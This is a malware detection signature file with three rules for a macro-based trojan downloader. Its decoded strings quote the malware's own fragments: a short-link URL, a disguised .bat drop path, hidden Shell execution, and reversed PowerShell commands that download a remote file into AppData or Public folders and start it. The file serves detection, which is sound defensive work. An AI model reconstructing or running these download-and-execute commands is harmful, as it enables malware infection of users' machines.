
rule TrojanDownloader_O97M_Obfuse_JH_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.JH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {68 74 74 70 3a 2f 2f 6f 77 2e 6c 79 2f 51 6f 48 62 4a } //01 00  http://ow.ly/QoHbJ
		$a_01_1 = {43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c 41 64 6f 62 65 52 65 61 64 65 72 2e 62 61 74 } //01 00  C:\Windows\Temp\AdobeReader.bat
		$a_01_2 = {53 68 65 6c 6c 28 73 74 72 53 61 76 65 54 6f 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 } //01 00  Shell(strSaveTo, vbNormalFocus)
		$a_01_3 = {6f 62 6a 46 53 4f 2e 44 65 6c 65 74 65 46 69 6c 65 20 28 73 74 72 53 61 76 65 54 6f 29 } //00 00  objFSO.DeleteFile (strSaveTo)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_JH_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.JH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_03_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 90 02 09 2e 43 61 70 74 69 6f 6e 29 2e 43 72 65 61 74 65 28 90 02 09 20 2b 20 90 02 09 2c 20 90 02 09 2c 20 90 02 09 2c 20 90 02 09 29 90 00 } //01 00 
		$a_03_1 = {2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 90 02 09 2e 43 61 70 74 69 6f 6e 90 00 } //01 00 
		$a_01_2 = {53 68 6f 77 57 69 6e 64 6f 77 21 20 5f } //00 00  ShowWindow! _
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_JH_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.JH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 74 72 52 65 76 65 72 73 65 28 22 6f 50 22 29 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 22 53 72 65 77 22 29 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 22 2d 20 6c 6c 65 68 22 29 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 22 78 45 22 29 } //01 00  StrReverse("oP") + StrReverse("Srew") + StrReverse("- lleh") + StrReverse("xE")
		$a_01_1 = {53 74 72 52 65 76 65 72 73 65 28 22 27 73 62 76 2e 74 6e 65 69 6c 43 5c 25 41 54 41 44 50 50 41 25 27 20 73 73 65 63 6f 72 50 2d 74 72 61 74 53 3b 29 27 73 62 76 2e 74 6e 65 69 6c 43 5c 25 41 54 41 44 50 50 41 25 27 2c 27 67 70 6a 2e 31 34 62 69 6c 69 34 34 36 31 5f 70 2f 6f 69 2e 70 6f 74 34 70 6f 74 2e 68 2f 2f 3a 73 70 74 74 68 27 28 65 6c 69 46 64 61 6f 6c 6e 77 6f 44 2e 29 74 6e 65 69 6c 43 62 65 57 2e 74 65 4e 2e 6d 65 74 22 29 } //01 00  StrReverse("'sbv.tneilC\%ATADPPA%' ssecorP-tratS;)'sbv.tneilC\%ATADPPA%','gpj.14bili4461_p/oi.pot4pot.h//:sptth'(eliFdaolnwoD.)tneilCbeW.teN.met")
		$a_01_2 = {53 68 65 6c 6c 20 45 6e 76 69 72 6f 6e 24 28 53 74 72 52 65 76 65 72 73 65 28 22 43 45 50 53 4d 4f 43 22 29 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 22 20 63 2f 20 22 29 20 26 20 50 53 68 65 6c 6c 43 6f 64 65 2c 20 76 62 48 69 64 65 } //01 00  Shell Environ$(StrReverse("CEPSMOC")) & StrReverse(" c/ ") & PShellCode, vbHide
		$a_01_3 = {53 74 72 52 65 76 65 72 73 65 28 22 27 73 62 76 2e 74 6e 65 69 6c 43 5c 25 63 69 6c 62 75 70 25 27 20 73 73 65 63 6f 72 50 2d 74 72 61 74 53 3b 29 27 73 62 76 2e 74 6e 65 69 6c 43 5c 25 63 69 6c 62 75 70 25 27 2c 27 67 70 6a 2e 32 30 71 73 31 78 34 34 36 31 5f 70 2f 6f 69 2e 70 6f 74 34 70 6f 74 2e 69 2f 2f 3a 73 70 74 74 68 27 28 65 6c 69 46 64 61 6f 6c 6e 77 6f 44 2e 29 74 6e 65 69 6c 43 62 65 57 2e 74 65 4e 2e 6d 65 74 22 29 } //00 00  StrReverse("'sbv.tneilC\%cilbup%' ssecorP-tratS;)'sbv.tneilC\%cilbup%','gpj.20qs1x4461_p/oi.pot4pot.i//:sptth'(eliFdaolnwoD.)tneilCbeW.teN.met")
	condition:
		any of ($a_*)
 
}